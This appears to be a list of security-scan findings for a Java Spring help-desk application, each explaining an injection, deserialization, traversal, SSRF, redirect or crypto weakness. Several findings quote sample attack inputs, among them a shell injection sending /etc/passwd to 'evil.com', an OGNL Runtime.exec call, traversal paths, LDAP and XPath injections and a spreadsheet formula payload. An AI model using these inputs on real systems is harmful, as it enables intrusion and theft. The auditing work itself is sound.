extra.message: Path variable `expr` is passed directly to Ognl.getValue(expr, context). OGNL expressions can invoke arbitrary static methods (e.g. @java.lang.Runtime@getRuntime().exec(...)), giving remote code execution to any caller who can reach this endpoint.

Attacker-controlled path variable `snippet` is compiled and executed directly as a FreeMarker template. FreeMarker's Execute/ObjectConstructor built-ins allow arbitrary OS command execution from the template string (server-side template injection).

The `title` request parameter is concatenated unescaped into a shell command string executed via `new ProcessBuilder("sh","-c", "wkhtmltopdf " + page + " " + out)`. A value like `report; curl evil.com/$(cat /etc/passwd)` executes arbitrary commands with the application's privileges.

The `prefix` request parameter is concatenated directly into a SQL LIKE clause (`"select id from tickets where ref like '" + prefix + "%' ..."`) executed via JdbcTemplate with no parameterization, allowing SQL injection by any support agent calling the bulk-close endpoint.

The `rd_queue_view` cookie value is base64-decoded and passed to a raw `ObjectInputStream.readObject()` with no type filtering. Since the cookie is fully client-controlled, a crafted gadget-chain payload can achieve remote code execution. Paired write path at lines 132-151 serializes the filter into the same cookie.

A locally created ObjectMapper calls `enableDefaultTyping()` and then `readValue(manifest, Object.class)` on an API-key-authenticated request body. Polymorphic deserialization driven by attacker-supplied type hints enables a classic Jackson gadget-chain RCE if such classes are on the classpath.

DocumentBuilderFactory is instantiated with no hardening (no FEATURE_SECURE_PROCESSING, DOCTYPE disallow, or external entity disabling) and parses the attacker-supplied `document` body from an API-key-authenticated XML ticket-ingestion endpoint, allowing XXE for local file disclosure or SSRF.

extra.message: The `ref` request parameter is concatenated directly into an XPath expression (`"//ticket[ref='" + ref + "']/subject"`). An injected value such as `' or '1'='1` alters query logic to extract unintended node data.

extra.message: Path variable `name` is resolved against `attachmentDir/templates` with no normalization or boundary check before `Files.readString`. A value like `../../../../etc/passwd` escapes the intended directory and returns arbitrary file contents.

`storeRaw()` uses the client-supplied `file.getOriginalFilename()` verbatim as the on-disk file name with no sanitization, unlike the sibling `store()`/`resolve()` methods. An uploaded filename like `../../../../opt/relaydesk/application.yml` writes/overwrites arbitrary files outside the attachment directory.

The `name` request parameter is resolved against `attachmentDir` with no normalization before `Files.readAttributes`, allowing traversal outside the intended directory to probe existence/size/mtime of arbitrary files.

Neither ProvisionController nor ProvisionService (see ProvisionService.java:56, user.setRole(role)) performs any role/authorization check on the caller beyond the shared internal key. Any request passing InternalKeyFilter can set an arbitrary user's role to SUPPORT_ADMIN or rewrite org/team scope, yielding unrestricted privilege escalation if the shared key is ever misused.

`allowedOriginPatterns("*")` combined with `allowCredentials(true)` on `/desk/**` causes Spring to echo back any Origin with credentials allowed. Any malicious website can issue credentialed cross-origin requests and read authenticated responses, including the CSRF token, defeating CSRF protection.

A fixed username/password (`bridge@relaydesk.test` / `Bridge-Metrics-2026`) is auto-provisioned with SUPPORT_ADMIN (full admin) privileges on startup whenever the account doesn't exist. Source access reveals full admin login credentials.

The AES key used to encrypt/decrypt partner mail-gateway envelopes is a literal string compiled into source. Anyone with source/jar access can decrypt intercepted envelopes and forge new ones, since CBC mode here carries no integrity check.

extra.message: The AES key used to open saved-report links is a fixed literal in source. Anyone who reads the source/decompiles the artifact can craft arbitrary report-link ciphertext since no MAC/authentication tag is used to detect tampering.

extra.message: The job POSTs to `endpoint.getUrl()`, a value stored verbatim from admin-configured WebhookEndpoint records, with no scheme/host/IP validation (no denylist of loopback, link-local/cloud-metadata, or internal ranges). An admin or a compromised admin session can point delivery at internal infrastructure to scan/pivot internally.

`create()` (lines 69-96) accepts an admin-supplied webhook URL with no allowlist/private-IP filtering, and `fireTest()` immediately issues an outbound POST to it, enabling SSRF against internal services from the application server.

The `target` path variable is used unvalidated to build `http://" + target + "/actuator/health"`, fetched server-side with the response body reflected back, letting an admin-authenticated caller probe internal hosts/ports (e.g. cloud metadata endpoints).

The `rd_desk_sid` cookie carries the literal session token with `HttpOnly=false` and `Secure=false`. Any XSS can steal it via document.cookie, and it can be captured in plaintext over unencrypted/MITM'd HTTP, leading to full session hijacking. The same pattern is reused for partnerLaunch/inviteAccept flows.

The `rtn` request parameter is appended verbatim after the `redirect:` prefix with no check that it is a local/relative path, so `rtn=https://evil.example` redirects a logged-in agent to an attacker site after a file-upload POST.

The Referer header is stripped of only a leading `http(s)://host` via regex before being used in `redirect:` + path. A protocol-relative value like `//evil.example/path` doesn't match the regex and passes through, and browsers follow `//host` as scheme-relative, causing an off-site redirect. The same pattern recurs in GlobalExceptionHandler.java (fallback, lines 151-157).

Any caller can append `?embeded=true` to set `X-Frame-Options: ALLOWALL` on an authenticated dashboard page, allowing it to be iframed by an attacker-controlled site for clickjacking against logged-in staff.

extra.message: `/actuator/**` (not restricted to `/actuator/health`) is granted `permitAll()` at the Spring Security layer. If additional actuator endpoints (env, beans, heapdump, mappings) are exposed via management configuration, they become reachable without authentication.

`mail` is concatenated directly into an LDAP search filter (`"(mail=" + mail + ")"`) with no escaping of LDAP metacharacters. The value originates from an admin-uploaded CSV row (ImportService.executeContactsRow, line 205), so a crafted CSV value like `*)(uid=*))(|(mail=*` broadens the search and returns unintended directory records.

extra.message: `encodeField` never neutralizes leading `=`, `+`, `-`, or `@`. Customer-controlled ticket `subject` (set freely via TicketCreateForm with no sanitization) flows into CSV exports in ExportService (lines 80, 198), so a subject like `=cmd|' /C calc'!A0` executes as a formula when staff open the export in Excel/Sheets.

extra.message: The phone-support callback PIN is hashed with unsalted MD5 (`DigestUtils.md5DigestAsHex`), which has no key-stretching. A low-cardinality numeric PIN hashed this way is trivially brute-forced offline from a leaked `callbackPinHash` column, allowing caller impersonation.

cwe: CWE-327: Use of a Broken or Risky Cryptographic Algorithm

extra.message: Every user's shared-inbox passphrase is hashed with PBKDF2-HMAC-SHA1 under the same hardcoded salt (`INBOX_SALT`, line 60-61) for all accounts and only 1024 iterations, enabling a single precomputed table to attack every account and making brute force comparatively cheap.

cwe: CWE-760: Use of a One-Way Hash with a Predictable Salt

extra.message: A SUPPORT_ADMIN account is provisioned with a hardcoded, documented password (`Admin@Relay1`) whenever `relaydesk.seed-enabled` is true and the users table is empty. If that flag is ever left on in a reachable environment, anyone with source access gains instant admin login.

The internal service key is compared with `String.equals()`, which short-circuits on the first mismatching byte. A network attacker able to measure response-time variance could incrementally recover the key via a timing side-channel instead of brute-forcing the full secret space.

Same non-constant-time `.equals()` comparison pattern gating every `/internal/**` endpoint, including the privileged provisioning API, behind a single shared secret vulnerable to a byte-at-a-time timing side-channel.

Both the callback-PIN and inbox-passphrase hash comparisons use `String.equals`, which short-circuits on the first differing character rather than comparing in constant time, adding a timing side-channel for guessing the stored digest.

On every delivery failure the full outbound webhook payload (ticket/event data) is written unredacted to the application log at WARN level, leaking potentially sensitive customer/ticket content into log aggregation systems with broader access than the originating data store.

extra.message: `findByTicketIdOrderByCreatedAtAsc` returns the entire message history for a ticket with no Pageable/limit. A customer able to post many replies to their own ticket can force every subsequent load of that ticket's conversation to materialize an unbounded result set in memory.
